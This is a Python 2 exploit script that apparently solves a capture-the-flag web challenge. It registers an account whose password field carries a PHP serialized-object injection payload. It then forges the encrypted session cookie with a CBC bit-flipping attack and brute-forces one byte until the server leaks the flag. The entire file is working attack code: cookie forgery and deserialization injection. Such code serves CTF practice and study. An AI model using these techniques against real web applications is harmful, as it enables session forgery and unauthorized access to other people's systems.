#!/usr/bin/python -u
import sys
import urllib2
import urllib
import random
import string

victim = "https://pwn.moe/donmai/donmai/aad407a75bda64301f88d29bae5dd799/"
cookie = ""

rand_str = lambda x: ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(x))
slice = lambda x, y: map(''.join, zip(*[iter(x)]*y))
xor = lambda x, y: ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(x,y))

def join(username, password):
    data = {'username': username, 'password': password, 'reg': 'Register'}
    data = urllib.urlencode(data)
    r = urllib2.urlopen(victim, data).read().split("<h3>")[1].split("</h3")[0]
    return r

def login(username, password):
    global cookie
    data = {'username': username, 'password': password, 'sign': 'Login'}
    data = urllib.urlencode(data)
    r = urllib2.urlopen(victim, data)
    cookie = r.headers.get('Set-Cookie')
    return r.read().split("<h3>")[1].split("</h3>")[0]

def main():
    global cookie
    r = urllib2.Request(victim)
    r.add_header('Cookie', cookie)
    r = urllib2.urlopen(r).read()
    return r

def exploit(o, i):
    global cookie
    ''' Blocks
      [0]=>
      string(16) "O:7:"Neptune":5:"
                 "O:005:"Uzume":5:" << 005 = 5
      ...
      [7]=>
      string(16) " Nept?ne passwor"
      [8]=>            |-------------- Need +0 or 00, ~128 trials
      string(16) "d";s:?0:"";s:4:""
    '''
    # we just need to bruteforce a single byte for this attack
    k = chr(i)
    # Blocks to change
    p = ['O:7:"Neptune":5:', '\x00Neptune\x00Password']
    f = ['O:005:"Uzume":5:', '\x00Nept' + k + 'ne\x00Password']
    # parse cookie
    _cookie = o[cookie.find('donmai=')+7:cookie.find(';')]
    # split iv and c
    iv = _cookie[:32].decode('hex')
    c = slice(_cookie[32:].decode('hex'), 16)
    # To change plaintext of c[0]
    # IV = IV ^ p[0] ^ f[0]
    iv = xor(iv, p[0])
    iv = xor(iv, f[0])
    # To change plaintext of c[8]
    # c[7] = c[7] ^ p[8] ^ f[8]
    c[7] = xor(c[7], p[1])
    c[7] = xor(c[7], f[1])
    # merge back
    _exploit = iv.encode('hex') + ''.join(c).encode('hex')
    cookie = "donmai=%s;" % (_exploit,)

if __name__ == "__main__":
    username = rand_str(16)
    password = '";s:4:"flag";C:13:"ArrayIterator":50:{x:i:0;a:1:{S:4:"\\41SIS";S:7:"\\6bawaii~";};'
    print('[*] Register: %s' % (join(username, password),))
    print('[*] Login: %s ' % (login(username, password),))
    orig_cookie = cookie
    user_input = raw_input('[?] One-shot?(y/n): ')
    if "y" in user_input:
        exploit(orig_cookie, 102)
        r = main()
        if "ASIS{" in r:
            print(cookie)
            print(r)
        else:
            print('[!] Flag leak failed..')
    else:
        for i in xrange(0, 128):
            print('[*] Trial %s/128' % (i,))
            exploit(orig_cookie, i)
            r = main()
            if "ASIS{" in r:
                print(cookie)
                print(r)
                sys.exit(0)
        print('[!] Flag leak failed.. something is wrong.')